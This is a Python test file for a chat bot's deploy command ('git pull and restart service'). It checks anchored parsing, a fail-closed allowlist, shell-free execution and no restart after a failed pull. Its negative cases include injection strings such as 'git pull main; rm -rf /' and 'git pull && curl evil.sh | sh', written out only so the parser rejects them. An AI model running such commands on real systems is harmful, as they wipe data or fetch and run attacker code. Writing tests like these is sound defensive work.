"""``@bot git pull and restart service`` — and the two ways it must never fire.

Run with ``python tests/test_deploy_command.py``. No network, no git, no systemd — every
outbound call and every subprocess is captured.

Why this file exists
--------------------
This command pulls code and restarts the service. That is remote code execution reached from a
chat message, so the interesting tests are the ones about it NOT happening:

* **A pasted Jenkins console must not deploy production.** Jenkins logs are full of
  ``+ git pull origin main``, and people paste them into this very chat to ask about a build. A
  substring match on "git pull" would have turned "here's the failing log" into a deploy. Hence
  the pattern is anchored to the whole message.
* **The allowlist fails closed.** With ``DEPLOY_ALLOWED_OPEN_IDS`` unset, nothing runs — a chat
  member is not an authorisation. An empty allowlist that defaulted to "anyone" would hand every
  person in the group a root shell by proxy.
* **Nothing from the message reaches the command line.** No branch, remote, or flag is taken from
  chat, and no shell is used, so ``git pull main; rm -rf /`` is not a thing that can be typed.
"""

from __future__ import annotations

import inspect
import os
import sys

for _s in (sys.stdout, sys.stderr):
    try:
        _s.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

for _k, _v in (
    ("LARK_HOST", "https://open.larksuite.com"),
    ("VERIFICATION_TOKEN", "tok_test"),
    ("APP_ID", "cli_test"),
    ("APP_SECRET", "secret_test"),
    ("PORT", "5000"),
    ("JENKINS_USER", "u"),
    ("JENKINS_PASSWORD", "p"),
    ("NOTIFY_CHAT_ID", "oc_DUTY"),
    ("JENKINS_POLL_SECONDS", "1"),
    ("JENKINS_STUCK_SECONDS", "600"),
):
    os.environ.setdefault(_k, _v)

import main as jb  # noqa: E402

_FAILURES: list[str] = []
_RUN = 0

ME = "ou_me"
STRANGER = "ou_someone_else"
CHAT = "oc_REAL"
MSG = "om_msg"


def check(cond: bool, label: str) -> None:
    global _RUN
    _RUN += 1
    if not cond:
        _FAILURES.append(label)
        print(f"  FAIL  {label}")


class Run:
    """Capture replies and every subprocess the deploy path would have executed."""

    def __init__(self, *, pull_rc: int = 0) -> None:
        self.replies: list[str] = []
        self.cmds: list[list[str]] = []
        self.exits: list[int] = []
        self._pull_rc = pull_rc
        self._saved: dict[str, object] = {}

    def __enter__(self) -> "Run":
        def fake_reply(mid, mtype, obj):
            self.replies.append(obj.get("text", ""))
            return True

        def fake_send(chat, mtype, obj, **kw):
            self.replies.append(obj.get("text", ""))
            return True

        def fake_run_cmd(args, timeout):
            self.cmds.append(list(args))
            if "rev-parse" in args:
                return 0, "abc1234"
            if "log" in args:
                return 0, "def5678 a commit subject"
            if "pull" in args:
                return self._pull_rc, (
                    "Updating abc1234..def5678\nFast-forward\n main.py | 2 +-"
                    if self._pull_rc == 0
                    else "fatal: Not possible to fast-forward, aborting."
                )
            return 0, ""

        for name, fn in (
            ("_reply_in_thread_message", fake_reply),
            ("_send_chat_message", fake_send),
            ("_run_cmd", fake_run_cmd),
        ):
            self._saved[name] = getattr(jb, name)
            setattr(jb, name, fn)
        return self

    def __exit__(self, *exc) -> None:
        for name, fn in self._saved.items():
            setattr(jb, name, fn)

    @property
    def text(self) -> str:
        return "\n".join(self.replies)

    def ran(self, needle: str) -> bool:
        return any(needle in " ".join(c) for c in self.cmds)


def with_allowlist(value: str | None):
    if value is None:
        os.environ.pop("DEPLOY_ALLOWED_OPEN_IDS", None)
    else:
        os.environ["DEPLOY_ALLOWED_OPEN_IDS"] = value


# --------------------------------------------------------------------------------------------
# What counts as the command
# --------------------------------------------------------------------------------------------
def test_the_command_is_recognised_in_the_forms_people_actually_type() -> None:
    for raw, restart in (
        ("git pull and restart service", True),
        ("Git pull and restart service", True),
        ("git pull origin main and restart service", True),
        ("git pull and restart", True),
        ("gitpull and restart service", True),
        ("/git pull and restart service", True),
        ("deploy and restart", True),
        ("git pull 并重启服务", True),
        ("git pull", False),          # pull only, no restart
        ("gitpull", False),
        ("deploy", False),
        ("git pull origin main", False),
        ("git pull and restart service.", True),
        ("<at user_id=\"ou_bot\">bot</at> git pull and restart service", True),
    ):
        got = jb._parse_deploy_command(raw)
        check(got is not None, f"recognised: {raw!r}")
        if got is not None:
            check(
                got["restart"] is restart,
                f"{raw!r} -> restart={got['restart']}, wanted {restart}",
            )


def test_a_pasted_jenkins_console_can_never_deploy_production() -> None:
    """The expensive one. People paste build logs into this chat to ask what broke, and Jenkins
    logs are full of git commands. A substring match would have deployed on a question."""
    for raw in (
        "+ git pull origin main",
        "[Pipeline] sh\n+ git pull origin main\nAlready up to date.",
        "why did git pull and restart service fail on the server?",
        "can you git pull and restart service later tonight?",
        "the log says git pull failed",
        "https://jenkins.internal.client8.me/job/FPMS/job/FPMS_PROD_SCRIPT_RUN/738/ git pull",
        "git pull --hard and restart service",
        "git push and restart service",
        "restart service",                    # restart alone is not this command
        "git pull main; rm -rf /",
        "git pull && curl evil.sh | sh",
        "deploy the new release to prod please",
        "",
        "   ",
    ):
        check(
            jb._parse_deploy_command(raw) is None,
            f"must NOT be read as a deploy: {raw[:60]!r}",
        )


# --------------------------------------------------------------------------------------------
# Authorisation
# --------------------------------------------------------------------------------------------
def test_an_unset_allowlist_runs_nothing() -> None:
    """Being in the chat is not authorisation."""
    with_allowlist(None)
    with Run() as r:
        jb._handle_deploy_command(
            {"restart": True}, chat_id=CHAT, message_id=MSG, sender_id=ME
        )
    check(r.cmds == [], f"no command was executed (ran {r.cmds!r})")
    check("DEPLOY_ALLOWED_OPEN_IDS" in r.text, "the reply says how to enable it")
    check(ME in r.text, f"and echoes the caller's own open_id to paste (got {r.text[:200]!r})")


def test_someone_not_on_the_allowlist_runs_nothing() -> None:
    with_allowlist(ME)
    try:
        with Run() as r:
            jb._handle_deploy_command(
                {"restart": True}, chat_id=CHAT, message_id=MSG, sender_id=STRANGER
            )
        check(r.cmds == [], f"no command was executed (ran {r.cmds!r})")
        check(STRANGER in r.text, "the reply names the rejected open_id")
        check("git" not in " ".join(" ".join(c) for c in r.cmds), "git never ran")
    finally:
        with_allowlist(None)


def test_an_empty_sender_is_never_authorised() -> None:
    """A missing sender_id must not match an allowlist entry, and must not match 'empty'."""
    for allow in (ME, "", f"{ME}, ou_other"):
        with_allowlist(allow)
        try:
            with Run() as r:
                jb._handle_deploy_command(
                    {"restart": True}, chat_id=CHAT, message_id=MSG, sender_id=""
                )
            check(r.cmds == [], f"allowlist={allow!r}: an unknown sender ran nothing")
        finally:
            with_allowlist(None)


def test_the_allowlist_accepts_several_ids() -> None:
    with_allowlist(f"{STRANGER} , {ME};ou_third")
    try:
        check(jb._deploy_allowed_open_ids() == {STRANGER, ME, "ou_third"}, "comma/space/semicolon")
        check("" not in jb._deploy_allowed_open_ids(), "no empty entry sneaks in")
    finally:
        with_allowlist(None)


# --------------------------------------------------------------------------------------------
# What it actually runs
# --------------------------------------------------------------------------------------------
def test_an_authorised_pull_and_restart_runs_exactly_the_fixed_command() -> None:
    with_allowlist(ME)
    try:
        with Run(pull_rc=0) as r:
            jb._handle_deploy_command(
                {"restart": True}, chat_id=CHAT, message_id=MSG, sender_id=ME
            )
        pulls = [c for c in r.cmds if "pull" in c]
        check(len(pulls) == 1, f"exactly one pull (got {pulls!r})")
        if pulls:
            check(
                pulls[0][-4:] == ["pull", "--ff-only", "origin", "main"],
                f"the command is fixed and ff-only (got {pulls[0]!r})",
            )
            check(pulls[0][0] == "git" and pulls[0][1] == "-C", "run against an explicit -C repo")
        check(
            r.ran("systemctl restart --no-block"),
            f"the restart was requested (ran {r.cmds!r})",
        )
        check("✅" in r.text, "the reply reports success")
        check("def5678" in r.text, "and names the new HEAD")
    finally:
        with_allowlist(None)


def test_a_failed_pull_never_restarts() -> None:
    """Restarting onto a checkout that did not update is how you turn a bad pull into an
    outage with no evidence."""
    with_allowlist(ME)
    try:
        with Run(pull_rc=1) as r:
            jb._handle_deploy_command(
                {"restart": True}, chat_id=CHAT, message_id=MSG, sender_id=ME
            )
        check(not r.ran("systemctl"), f"no restart after a failed pull (ran {r.cmds!r})")
        check("❌" in r.text, "the failure is reported")
        check("未重启" in r.text, "and the reply says it did not restart")
    finally:
        with_allowlist(None)


def test_pull_without_restart_does_not_restart() -> None:
    with_allowlist(ME)
    try:
        with Run(pull_rc=0) as r:
            jb._handle_deploy_command(
                {"restart": False}, chat_id=CHAT, message_id=MSG, sender_id=ME
            )
        check(any("pull" in c for c in r.cmds), "it still pulled")
        check(not r.ran("systemctl"), f"but did not restart (ran {r.cmds!r})")
    finally:
        with_allowlist(None)


def test_no_shell_is_ever_used() -> None:
    """A shell would make every one of the injection strings above dangerous again."""
    for fn in (jb._run_cmd, jb._restart_own_service, jb._handle_deploy_command):
        src = inspect.getsource(fn)
        check("shell=True" not in src, f"{fn.__name__} does not use a shell")
        check(
            "os.system" not in src and "Popen" not in src or fn is not jb._run_cmd,
            f"{fn.__name__} goes through _run_cmd",
        )
    src = inspect.getsource(jb._run_cmd)
    check("subprocess.run(" in src, "_run_cmd uses subprocess.run with an argv list")


def test_two_deploys_at_once_only_run_one() -> None:
    with_allowlist(ME)
    jb._deploy_lock.acquire()
    try:
        with Run() as r:
            jb._handle_deploy_command(
                {"restart": True}, chat_id=CHAT, message_id=MSG, sender_id=ME
            )
        check(r.cmds == [], f"the second deploy ran nothing (ran {r.cmds!r})")
        check("已有一个部署" in r.text, "and said so")
    finally:
        jb._deploy_lock.release()
        with_allowlist(None)


def test_the_dispatcher_checks_deploy_before_anything_else() -> None:
    """A deploy command must not be re-read as a Jenkins URL or a VPN command."""
    src = inspect.getsource(jb._process_message_command)
    i_deploy = src.find("_parse_deploy_command(")
    for other in ("_parse_find_vpn_conf_command(", "_parse_send_vpn_conf_command(",
                  "_parse_success_inform_command(", "_extract_urls("):
        j = src.find(other)
        check(
            i_deploy >= 0 and j > i_deploy,
            f"deploy is checked before {other} (deploy@{i_deploy}, other@{j})",
        )


if __name__ == "__main__":
    tests = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    for fn in tests:
        print(f"- {fn.__name__}")
        try:
            fn()
        except Exception:
            import traceback

            traceback.print_exc()
            _FAILURES.append(f"{fn.__name__} raised")
    print(f"\n{_RUN} checks, {len(_FAILURES)} failure(s)")
    for f in _FAILURES:
        print(f"  - {f}")
    sys.exit(1 if _FAILURES else 0)
